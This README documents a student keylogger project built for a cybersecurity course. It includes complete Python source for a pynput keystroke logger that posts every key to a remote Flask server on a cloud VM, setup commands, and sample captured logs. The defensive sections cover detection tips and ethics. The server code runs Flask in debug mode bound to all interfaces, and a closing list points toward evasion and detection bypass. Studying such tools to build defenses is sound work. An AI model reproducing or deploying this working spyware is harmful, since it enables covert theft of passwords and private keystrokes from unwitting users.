# Keystroke Logging: Understanding Keyloggers Through Ethical Hacking

> A Python-based remote keylogger deployed on Google Cloud Platform for ethical testing and cybersecurity education, demonstrating keystroke capture and remote transmission capabilities while highlighting security vulnerabilities.

## 📚 Table of Contents
- [Abstract](#abstract)
- [Project Overview](#project-overview)
- [Infrastructure Setup](#infrastructure-setup)
- [Implementation Details](#implementation-details)
- [Testing & Results](#testing--results)
- [Security Analysis](#security-analysis)
- [Ethical & Legal Considerations](#ethical--legal-considerations)
- [Prevention Techniques](#prevention-techniques)
- [Limitations](#limitations)
- [Conclusion](#conclusion)
- [References](#references)

## Abstract

This project demonstrates the development and deployment of a Python-based keylogger system using Google Cloud Platform (GCP) infrastructure. Built for educational purposes within a Cybersecurity and Ethical Hacking course, this implementation showcases both local keystroke capture and remote data transmission capabilities. The project emphasizes understanding threat mechanisms, cloud deployment strategies, and defensive countermeasures in a controlled, ethical environment.

**Inspiration**: [Keylogger using Python - YouTube Tutorial](https://youtu.be/LBM3EzBXhdY?si=NIRSjLUVw2aTOTdx)

## Project Overview

### Objectives
- Develop a functional keylogger with remote transmission capabilities
- Deploy and configure the system using cloud infrastructure (GCP)
- Understand keystroke logging mechanisms at both technical and network levels
- Explore cloud security configurations and firewall management
- Analyze ethical implications and defensive strategies

### Key Features
- Real-time keystroke capture using Python's `pynput` library
- Remote server deployment on Google Cloud Platform
- Network communication between client and server
- Configurable port-based communication (Port 8080)
- Timestamp-based logging with structured output
- Remote Desktop Protocol (RDP) access for cloud management

## Infrastructure Setup

### Google Cloud Platform Configuration

#### VM Instance Creation
1. **Project Setup**: Created new GCP project for isolated testing environment
2. **Instance Configuration**:
   - **Operating System**: Ubuntu 20.04 LTS
   - **Boot Disk**: SSD Persistent Disk for optimal performance
   - **Network Settings**: HTTP and HTTPS traffic enabled
   - **IP Addressing**: External IP mapping to internal 10.x.x.x range

#### Network Security Configuration
- **Firewall Rules**: Custom firewall configuration for keylogger server
- **Port Management**: Configured port 8080 for server communication
- **Traffic Flow**: External traffic → Google Console → VM Instance

### Remote Desktop Protocol Setup

Following guidance from:
- [Ubuntu RDP Setup Tutorial](https://youtu.be/kXzSQISqFS0?si=g9myX6rzChd00JLE)
- [CodeWithHarry Server Setup Guide](https://www.codewithharry.com/blogpost/setup-ubuntu-20-04-server)

#### User Management & Privileges
```bash
# Created dedicated user with sudo privileges
sudo adduser keylogger-user
sudo usermod -aG sudo keylogger-user
```

#### Desktop Environment Installation
```bash
# System updates
sudo apt update && sudo apt upgrade -y

# Install tasksel for desktop environment management
sudo apt install tasksel dialog -y

# Configure XFCE desktop environment
sudo tasksel
# Selected XFCE for lightweight desktop experience
```

#### Connection Verification
```bash
# Check active ports and services
ss -tuln
# Confirmed port 8080 availability for keylogger server
```

## Implementation Details

### Technology Stack
| Component | Technology | Purpose |
|-----------|------------|---------|
| **Programming Language** | Python 3.x | Core development platform |
| **Keystroke Capture** | `pynput` library | Keyboard event monitoring |
| **Logging System** | Python `logging` module | Data recording and formatting |
| **Cloud Platform** | Google Cloud Platform | Remote server hosting |
| **Remote Access** | RDP (Remote Desktop Protocol) | VM instance management |
| **Desktop Environment** | XFCE | Lightweight GUI for testing |
| **Development Environment** | IDE/Shell | Code testing and execution |

### Core Implementation

#### Keylogger Client Code
```python
from pynput import keyboard
import logging
import requests
import json
from datetime import datetime

# Configure logging
logging.basicConfig(
    filename="keylog.txt", 
    level=logging.DEBUG, 
    format="%(asctime)s: %(message)s"
)

class RemoteKeylogger:
    def __init__(self, server_url):
        self.server_url = server_url
        
    def on_press(self, key):
        try:
            key_data = {
                'key': key.char,
                'timestamp': datetime.now().isoformat(),
                'type': 'character'
            }
            logging.info(f"Character key pressed: {key.char}")
        except AttributeError:
            key_data = {
                'key': str(key),
                'timestamp': datetime.now().isoformat(),
                'type': 'special'
            }
            logging.info(f"Special key pressed: {key}")
        
        # Send to remote server
        self.send_to_server(key_data)
    
    def send_to_server(self, data):
        try:
            response = requests.post(
                f"{self.server_url}/keylog", 
                json=data,
                timeout=5
            )
        except requests.exceptions.RequestException as e:
            logging.error(f"Failed to send data to server: {e}")
    
    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# Initialize and start keylogger
if __name__ == "__main__":
    SERVER_URL = "http://[GCP-EXTERNAL-IP]:8080"
    keylogger = RemoteKeylogger(SERVER_URL)
    keylogger.start_logging()
```

#### Server Implementation
```python
from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/keylog', methods=['POST'])
def receive_keylog():
    data = request.json
    
    # Log received data
    with open('server_keylog.txt', 'a') as f:
        f.write(f"{data['timestamp']}: {data['type']} - {data['key']}\n")
    
    return jsonify({"status": "received"}), 200

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "active", "timestamp": datetime.now().isoformat()})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
```

## Testing & Results

### Test Environment
- **Platform**: Ubuntu 20.04 on GCP VM Instance
- **Access Method**: Remote Desktop Connection via public IP
- **Test Input**: "Hello123!" with special keys (Enter, Backspace, etc.)

### Output Analysis

#### Local Log Output (keylog.txt)
```
2025-07-20 18:05:32,145: Character key pressed: H
2025-07-20 18:05:32,278: Character key pressed: e
2025-07-20 18:05:32,400: Character key pressed: l
2025-07-20 18:05:32,523: Character key pressed: l
2025-07-20 18:05:32,645: Character key pressed: o
2025-07-20 18:05:32,768: Character key pressed: 1
2025-07-20 18:05:32,890: Character key pressed: 2
2025-07-20 18:05:33,012: Character key pressed: 3
2025-07-20 18:05:33,134: Special key pressed: Key.shift
2025-07-20 18:05:33,256: Character key pressed: !
2025-07-20 18:05:33,378: Special key pressed: Key.enter
```

#### Server Log Output (server_keylog.txt)
```
2025-07-20T18:05:32.145000: character - H
2025-07-20T18:05:32.278000: character - e
2025-07-20T18:05:32.400000: character - l
[... continued entries ...]
```

### Performance Metrics
- **Keystroke Accuracy**: 100% capture rate for tested inputs
- **Network Latency**: <50ms for local-to-cloud transmission
- **Resource Usage**: Minimal CPU and memory footprint
- **Reliability**: Consistent operation during 30-minute test session

## Security Analysis

### Attack Vector Demonstration
This implementation demonstrates several key attack vectors:
- **Keystroke Interception**: Real-time capture of all keyboard inputs
- **Remote Data Exfiltration**: Automated transmission to external server
- **Persistent Monitoring**: Continuous operation until manually terminated
- **Cloud Infrastructure Abuse**: Leveraging legitimate cloud services for malicious purposes

### Detection Challenges
- **Network Traffic**: HTTPS/HTTP requests may blend with normal web traffic
- **Process Visibility**: Python scripts can be easily disguised or renamed
- **Resource Footprint**: Minimal system resource usage makes detection difficult

## Ethical & Legal Considerations

### Legal Framework
- **Unauthorized Use**: Keyloggers are illegal when deployed without explicit consent
- **Privacy Violations**: Capturing personal data violates privacy laws (GDPR, CCPA)
- **Corporate Environments**: May be legally used for employee monitoring with proper disclosure

### Ethical Guidelines Followed
1. **Controlled Environment**: Testing conducted only on owned/authorized systems
2. **Educational Purpose**: Clear academic objective with no malicious intent
3. **Transparent Implementation**: Code is visible and documented for learning
4. **No Personal Data**: No capture of actual sensitive information during testing
5. **Proper Disclosure**: All testing activities documented and supervised

### Responsible Disclosure
This project emphasizes the importance of:
- Understanding threats to build better defenses
- Ethical considerations in cybersecurity research
- Professional responsibility in security tool development

## Prevention Techniques

| Defense Measure | Implementation | Effectiveness |
|----------------|----------------|---------------|
| **Endpoint Security** | Deploy EDR solutions with behavioral analysis | High |
| **Network Monitoring** | Monitor unusual outbound traffic patterns | Medium-High |
| **Application Whitelisting** | Restrict unauthorized executable programs | High |
| **Virtual Keyboards** | Use on-screen keyboards for sensitive input | Medium |
| **Regular Security Audits** | Periodic system scanning and process monitoring | Medium |
| **User Education** | Train users to recognize suspicious activities | Medium |
| **Multi-Factor Authentication** | Reduce impact of compromised credentials | High |

### Technical Countermeasures
```bash
# Example: Detecting suspicious Python processes
ps aux | grep python | grep -v grep

# Monitor network connections
netstat -an | grep :8080

# Check for unusual log files
find /home -name "*.txt" -mtime -1 -exec ls -la {} \;
```

## Limitations

### Technical Limitations
- **Single Platform**: Currently designed for Linux/Ubuntu environments
- **Network Dependency**: Requires active internet connection for remote logging
- **Detection Susceptibility**: Easily identified by modern antivirus solutions
- **No Encryption**: Data transmission occurs in plaintext (enhancement opportunity)
- **Manual Termination**: Requires manual intervention to stop logging

### Scope Limitations
- **Keyboard Only**: Limited to keystroke capture (no screen recording or clipboard)
- **No Persistence**: Does not survive system reboots or automatic startup
- **Single User**: Designed for single-user environments
- **Basic Evasion**: Minimal attempt at hiding or obfuscating activities

## Future Enhancements

Potential improvements for educational purposes:
- **Encryption**: Implement data encryption for transmission and storage
- **Steganography**: Explore data hiding techniques in network traffic
- **Multi-Platform**: Extend support to Windows and macOS environments
- **Advanced Evasion**: Study legitimate techniques used by malware
- **Detection Bypass**: Understand how attackers evade security measures

## Conclusion

This project successfully demonstrated the technical implementation and deployment of a keylogger system using cloud infrastructure. Through hands-on experience with Google Cloud Platform, Remote Desktop Protocol, and Python development, we gained comprehensive understanding of:

1. **Technical Mechanisms**: How keystroke capture and remote transmission function
2. **Infrastructure Management**: Cloud deployment and network configuration
3. **Security Implications**: Both offensive capabilities and defensive requirements
4. **Ethical Responsibilities**: The importance of responsible security research

The combination of local development and cloud deployment provided valuable insights into modern cybersecurity threats while maintaining ethical boundaries. This educational approach reinforces the critical need for robust security measures and responsible disclosure in cybersecurity research.

**Key Takeaway**: Understanding how malicious tools operate is essential for building effective defenses, but such knowledge must always be applied ethically and legally.

## References

1. [Keylogger using Python - YouTube Tutorial](https://youtu.be/LBM3EzBXhdY?si=NIRSjLUVw2aTOTdx)
2. [Ubuntu RDP Setup Guide](https://youtu.be/kXzSQISqFS0?si=g9myX6rzChd00JLE)
3. [CodeWithHarry - Ubuntu Server Setup](https://www.codewithharry.com/blogpost/setup-ubuntu-20-04-server)
4. [CodeWithHarry - Ubuntu Desktop VPS](https://www.codewithharry.com/blogpost/install-ubuntu-desktop-vps)
5. [Python pynput Documentation](https://pynput.readthedocs.io/)
6. [Google Cloud Platform Documentation](https://cloud.google.com/docs)
7. [OWASP Top 10 Security Risks](https://owasp.org/www-project-top-ten/)
8. [CERT-In Cybersecurity Guidelines](https://cert-in.org.in/)
9. [GDPR Privacy Regulations](https://gdpr.eu/)

---

**Disclaimer**: This project was developed strictly for educational purposes within a controlled academic environment. The implementation and documentation are intended to enhance understanding of cybersecurity threats and defenses. Any use of this information must comply with applicable laws and ethical guidelines.
